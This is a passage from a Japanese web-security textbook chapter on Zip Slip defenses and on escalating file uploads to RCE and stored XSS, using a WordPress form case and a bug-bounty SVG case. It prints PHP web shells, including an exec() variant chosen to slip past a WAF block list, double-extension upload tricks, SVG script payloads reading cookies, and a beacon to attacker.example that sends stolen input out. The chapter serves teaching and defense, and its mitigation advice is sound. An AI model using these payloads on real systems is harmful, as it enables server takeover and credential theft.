6. **メンテされたライブラリの最新版を使う**: 前掲の修正済みバージョン以上を使う。ただし「高水準APIが無いエコシステム（`java.util.zip`, Go `archive`, 旧Python `tarfile` など）」では、ライブラリ更新だけでは守れず、上記の検証を自分で必ず書く。
7. **最小権限で展開する**: 展開プロセスの権限・書き込み可能範囲を絞り、万一のトラバーサルでも重要ファイルへ届かないよう多層防御する（chroot / コンテナ / 専用の書き込み専用ディレクトリなど）。
8. **付随する対策**: Zip Slip とは別だが、アーカイブ展開では「展開後の総サイズ・ファイル数の上限」も設けること（いわゆる zip bomb 対策）。トラバーサル検証とは独立に必要な防御である。

---

### まとめ

- Zip Slip は、**アーカイブのエントリ名（攻撃者が完全に制御できる入力）を、展開先パスと素朴に連結し、検証せず書き込み先に使う**ことで起きる、任意ファイル上書き脆弱性である。
- 根本原因は `new File(dir, name)` / `path.join` などの**パス連結APIが `..` を解決も検証もしない**という素直な仕様にあり、OSがパス解決する段階で展開先の外へ抜け出す。RCEに直結しうる critical 級。
- 2018年に Snyk が命名・公開し、tar/jar/war など幅広い形式、Java・JS・.NET・Go・Ruby など多数のエコシステムの数千プロジェクトに影響した。特に「安全な高水準APIが無い」環境では、利用者側にパターンが残り続ける。
- 防御の原理は普遍で、**「正規化してから、展開先ディレクトリ配下（区切り文字境界込み）に収まるかを、書き込み前に検証し、外なら拒否する」**。これを言語ごとの正規化API（`getCanonicalPath` / `path.resolve` / `Path.GetFullPath` / `filepath.Abs`）で実装する。Python 3.12+ の `tarfile` は `filter="data"` で安全側にできる。

## アップロードからRCE/Stored XSSへの昇格

ファイルアップロード機能そのものは「入力を受け取り、ファイルシステムやオブジェクトストレージに保存する」だけのシンプルな仕組みだが、検証が不十分だとアップロードは一気に強力な**sink（入力が最終的に実行・解釈される危険な代入先）**に変わる。本節では、(1) アップロードしたファイルをサーバ側で実行させてRCE（Remote Code Execution、リモートコード実行）に至る古典的だが今なお現役の手口と、(2) アップロードしたファイルを他の利用者に「表示」させることでStored XSS（永続化されたクロスサイトスクリプティング）に至る手口を、実例をもとに整理する。両者は「アップロード後にそのファイルが誰の権限・どのコンテキストで解釈されるか」という一点に集約される、という視点を持って読み進めてほしい。

### ケース1: 拡張子とWAFのすり抜けによるRCE（WordPress問い合わせフォームの事例)

Clear Gateのペネトレーションテスターが公開した事例は、WordPressサイトの「問い合わせフォーム（写真添付可）」を対象にしたものである。表向きは「画像しか受け付けない」フォームだったが、実際には拡張子・Content-Typeの検証が甘く、最終的にRCEまで到達している。

> 出典: Clear Gate「Exploiting a File Upload Mechanism to Gain RCE」 — https://www.clear-gate.com/blog/exploiting-a-file-upload-mechanism-to-gain-rce/

#### 偵察: 保存先パスの漏えい

まず攻撃者は正規のPNGファイルをアップロードした。すると、サーバのレスポンスに**アップロード後の絶対パス**がそのまま含まれていた。これは一見「便利な機能」（アップロード成功後にファイルへのリンクを返す）に見えるが、攻撃者視点では次の2つの情報を同時に与えてしまっている。

- ファイルの保存先ディレクトリ構造（Web公開領域かどうか）
- 保存後のファイル名の規則性（推測可能かどうか）

これにより、後段でWebシェルを設置した際に「どのURLにアクセスすればコードを実行できるか」を確実に特定できる。**アップロード機能の脆弱性は単体では成立しないことが多く、「パス漏えい」と「実行可能領域への保存」の組み合わせで初めてRCEになる**という点が重要な学びである。パスをレスポンスに含めない、あるいはランダムなUUIDベースの名前に変換して返すだけでも、この後の攻撃連鎖は大きく難しくなる。

#### 拡張子検証のバイパス: 二重拡張子 + Content-Type偽装

次にアップロードされたのが、拡張子を `.png.php` とした二重拡張子ファイルである。

```php
<?php echo 123 ?>
```

このファイルを、リクエストの `Content-Type` ヘッダーを `image/png` に偽装した状態でアップロードした。検証が「拡張子の末尾が `.png` を含むか」「Content-Typeヘッダーの値が画像系か」といった**表層的な文字列チェック**に留まっていると、このファイルは通過してしまう。

ここで理解すべき仕組みは2段階ある。

1. **アプリケーション側のバリデーション**が甘い場合、`filename.png.php` は「拡張子が `.php` で終わっている」という事実を見落とされやすい。単純な `endsWith(".png")` ではなく、正規表現や `.` 区切りの最後の要素だけを見ていないチェックだと通過する。またContent-Typeヘッダーはクライアント（ブラウザやスクリプト）が自己申告する値であり、サーバ側が信頼してよい情報ではない——ファイルの中身（マジックバイト）を検査していなければ、いくらでも偽装できる。
2. **Webサーバ（Apache/Nginxなど）側の拡張子ハンドラ**は、通常「最後の拡張子」を見てハンドラ（PHPインタプリタなど）に渡すかどうかを決める。`filename.png.php` は最後の拡張子が `.php` なので、Apacheの `mod_php` 等はこれをPHPとして実行する。つまり**アプリケーション層の検証をすり抜けても、Webサーバ層の解釈規則と整合していなければ実害は出ない**が、この事例ではその両方が揃ってしまっていた。

アップロードしたファイルにアクセスすると `123` が出力され、**任意のPHPコードがサーバ上で解釈・実行される**ことが確認された。これはRCEの「実行確認（トリガー確認）」フェーズであり、次にペイロードを本格的なWebシェルへ差し替える段階に進む。

#### WAF（Web Application Firewall）のすり抜け: 関数のブロックリストの穴

最初に試したWebシェルは典型的な形である。

```php
<?php system($_GET["cmd"]); ?>
```

これはWAFにブロックされた。さらに `passthru()` や `shell_exec()` を使ったバリアントも同様にブロックされた。これは多くのWAFやホスティング事業者が、OSコマンド実行に使われる代表的なPHP関数（`system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open` など）を**シグネチャベース（文字列/正規表現マッチ）**で検出しているためである。しかし、このブロックリストは実装依存で、しばしば「代表的な関数だけ」を狙い撃ちしており網羅的ではない。この事例では `exec()` 関数を使ったペイロードがブロックを回避し、リモートからのコマンド実行に成功している。

```php
<?php exec($_GET["cmd"], $output); print_r($output); ?>
```

**なぜ `exec()` だけ通ったのか**という点の仕組みを整理すると、WAFのルールセットが「危険関数のブロックリスト」という有限集合の列挙に依存している以上、原理的に「まだ列挙されていない関数」や「列挙から漏れた綴り・大文字小文字・名前空間付き呼び出し」は必ず存在しうる、という限界がある。これはブロックリスト型防御全般が持つ構造的弱点であり、XSSのタグ／属性のブロックリスト回避と本質的に同じ構図である。防御側は「危険な操作そのもの（=ファイルをコードとして実行できる状態）」を無くす方が、個々の関数名を潰すよりも堅牢になる。

#### 最終的な影響

このチェーンにより、攻撃者は対象システムの完全な制御を獲得し、WordPressのデータベース内容や、サーバに保存されていたFTP認証情報を窃取できる状態に至ったと報告されている。攻撃の起点は「写真しか送れないはずの問い合わせフォーム」という、一見リスクが低く見える機能だった点に注意したい。

#### 防御策（原典が挙げる推奨事項）

Clear Gateの記事が示す防御策は、本教科書のこれまでの章とも整合する内容である。

- **MIMEタイプをファイルの実内容から検証する**: リクエストヘッダーの自己申告値ではなく、マジックバイト（ファイル先頭の固有バイト列）や画像デコード処理そのものが成功するかどうかで判定する。
- **拡張子は許可リスト（allowlist）方式にする**: 拒否リスト（denylist）は列挙漏れが必ず起きる。許可する拡張子（例: `.jpg`, `.png`, `.gif` のみ）以外は一律拒否する。
- **アップロード後の完全なファイルパスをレスポンスに含めない**: 保存先の物理パスや推測可能なファイル名を外部に晒さない。ランダムなトークン名で管理し、参照はDB経由の間接参照にする。
- **アンチマルウェアスキャンを通す**: アップロード直後に既知の悪性シグネチャと突き合わせる。
- **アップロード領域の実行権限を無効化する**: Webサーバ設定で、アップロード用ディレクトリに対して `php_admin_flag engine off`（Apache）や、Nginxでのロケーションブロックによるスクリプトハンドラ無効化、あるいはアップロード先をWebルート外や別オリジンのオブジェクトストレージ（署名付きURLのみで配信）に分離する、といった構成が有効である。この最後の対策が最も根本的で、**「アプリケーション層の検証をすり抜けられても、Webサーバがそもそもそのファイルをコードとして解釈しない」**という多層防御になる。

### ケース2: SVGアップロードによるStored XSS（ロゴ/背景/広告画像アップロード機能の事例）

> ⚠️ **未取得の資料**: 「How I was rewarded a $1000 bounty after abusing File Upload functionality to Stored XSS」（Kunal Khubchandani, Medium）は自動取得できませんでした（理由: 直接アクセスはHTTP 403、代替のキャッシュ・リーダー経由のアクセスもCAPTCHA/エラーで本文取得不可。Web検索により記事の要約情報のみ複数のスニペットから確認）。以下のURLからご自身で直接ご覧ください: https://kunalkhubchandani.medium.com/how-i-was-rewarded-a-1000-bounty-after-abusing-file-upload-functionality-to-stored-xss-945a40ac6f94

（以下は未取得資料の補足として、Web検索で得られた記事概要と、一般知識に基づく解説です）

検索結果から確認できた記事の概要は次のとおりである。対象サイトは「ロゴ画像」「背景画像」「広告画像」をアップロードできる機能を持ち、リサーチャーはそこに悪意のあるSVGファイルをアップロードした。アップロードした緑色のSVG画像がページ上で表示される際にJavaScriptが実行され、`prompt()` によるダイアログが表示された。リサーチャーはそこにランダムなパスワードらしき文字列を入力するデモを行い、「攻撃者が用意した偽の入力欄でユーザーの認証情報を盗み取れる」ことを実証し、1000ドルの報奨金を得たという内容である。原典に掲載されている正確なペイロード文字列そのものは本稿では確認できていないため、以下は一般的なSVGベースのStored XSSの仕組みの解説として読んでほしい。

#### なぜSVGアップロードがXSSになるのか（仕組み）

ここが本節の核心である。JPEGやPNGはピクセルデータの塊であり、それ自体に「実行可能なコード」を埋め込む一般的な経路はない。しかし**SVG（Scalable Vector Graphics）はXML文書である**。XMLである以上、ブラウザのレンダリングエンジンはSVGを「画像」ではなく「マークアップ文書」としてパースできてしまう。SVG仕様は次のような、HTMLと地続きの機能を許容している。

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie);
  </script>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" />
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="200" height="200">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src="x" onerror="alert(1)">
    </body>
  </foreignObject>
</svg>
```

これらが実行される条件は、**ブラウザがそのSVGを「HTMLに埋め込まれた画像」ではなく「HTML文書に準ずるもの」として解釈するコンテキストで開いたとき**である。具体的には次のような分岐がある。

- サーバが `Content-Type: image/svg+xml` のままそのファイルを直接返し、かつ `<img>` タグの `src` 属性ではなく、`<iframe>` や `<object>`、あるいはブラウザで直接そのURLを開く（＝新規ナビゲーション）形でレンダリングされた場合、SVG内の `<script>` や `on*` イベントハンドラは実行される。`<img src="upload.svg">` のように「画像として」埋め込まれた場合は、多くのブラウザでスクリプト実行が抑止される（が、CSSアニメーションや一部の派生読み込み経路では依然リスクが残る実装差もある）。
- サーバ側で**同一オリジン**からファイルが配信されている場合、実行されたスクリプトはそのオリジンの `document.cookie` やDOM、ログイン中セッションに対してフルアクセスを持つ。これが「単なる自己満足的なXSS」ではなく「他の閲覧者のセッションハイジャックや認証情報窃取につながるStored XSS」になる理由である。今回のケースのように「ロゴ画像」「広告画像」としてアップロードされたSVGが**サイトを訪れた別のユーザーの画面に自動的に表示される**設計であれば、蓄積型（Stored）XSSとして、攻撃者は被害者を一切操作せず能動的に攻撃を成立させられる。

`prompt()` を使ったデモは、`alert()` よりも実害を分かりやすく示すための定番のPoC（Proof of Concept）パターンである。偽のパスワード入力ダイアログをJavaScriptの `prompt()` で表示し、閲覧者が「サイトの正規の確認ダイアログ」だと誤認して入力してしまった値を、`fetch()` や `<img src="https://attacker.example/steal?v=...">` のようなビーコンで攻撃者サーバへ送信する、という流れを再現することで、審査担当者（トリアージ担当）に「これはただのalertではなく、実際の認証情報窃取に直結する」ことを一目で伝える効果がある。バグバウンティのレポート作成において、影響を過小評価されないための実証手法として有効な戦術である。

#### 検証すべきポイントと防御策

- **アップロードされた画像を配信するときのContent-Typeとレンダリング方法**: SVGを許可する場合でも、配信時に `Content-Type: image/svg+xml` ではなく `Content-Disposition: attachment` を付与してダウンロード強制にする、あるいはラスタ画像（PNG等）へサーバ側で再エンコードしてから配信する、という対策がとられる。再エンコードは「元のバイト列を一切保持せず、ピクセルデータとして再構成する」ため、XMLとしての構造そのものが失われ、埋め込みスクリプトは物理的に残らない。これはケース1の「MIMEタイプをファイルの実内容から検証する」対策とも通じる、**入力を信頼せず変換し直す**という一貫した設計思想である。
- **配信オリジンの分離**: ユーザーがアップロードしたコンテンツは、アプリケーション本体とは別のオリジン（例: `usercontent.example.com` のような、Cookieを共有しないサブドメイン）から配信する。これにより、万一スクリプトが実行されても、本体アプリケーションのセッションCookieやDOMには到達できない。
- **SVGサニタイズライブラリの利用**: `<script>` 要素、`on*` イベントハンドラ属性、`javascript:` スキームのURL、`foreignObject` などの危険要素/属性をパースして除去する専用のサニタイザ（DOMPurifyのSVGモード等）を通してから保存・配信する。単純な文字列置換（例えば `<script` を消すだけ）は大文字小文字の揺れやHTMLエンティティ、名前空間プレフィックスなどで容易に回避されるため、必ずXMLパーサベースの構造的なサニタイズを行う。
- **Content Security Policy (CSP)**: アップロードコンテンツを配信するレスポンスに厳格なCSP（`script-src 'none'` 等）を付与しておけば、万一サニタイズをすり抜けても、ブラウザ側でスクリプト実行がブロックされるという多層防御になる。

### まとめ: 2つの事例に共通する原則

ケース1（RCE）とケース2（Stored XSS）は、表面的には全く異なる脆弱性に見えるが、根っこにある構造は同じである。すなわち、**アップロードされたファイルが「データ」としてではなく「コード／マークアップ」として解釈される経路が、意図せず残っている**という点である。

- RCEのケースでは、Webサーバの拡張子ハンドラが `.php` 拡張子を持つファイルを「実行対象」として解釈した。
- XSSのケースでは、ブラウザがSVGファイルを「HTML相当の実行可能なマークアップ」として解釈した。

防御の原則も共通している。**「ファイルの中身を信頼せず実内容で検証する」「実行/解釈され得ないコンテキストでのみ配信する」「実行可能な領域とアップロード保存領域を分離する」**という3点は、拡張子検証・MIME検証・保存先設計・配信時ヘッダー設計のすべてに一貫して適用すべき設計原則であり、本節以降の章で扱う他のアップロード関連脆弱性（第8章の他節を参照）にも共通して当てはまる。


---

[← 第7章 アップロード検証のバイパス](07-upload-validation-bypass.md) ｜ [目次](index.md) ｜ [第9章 ツールと方法論 →](09-tools-methodology.md)
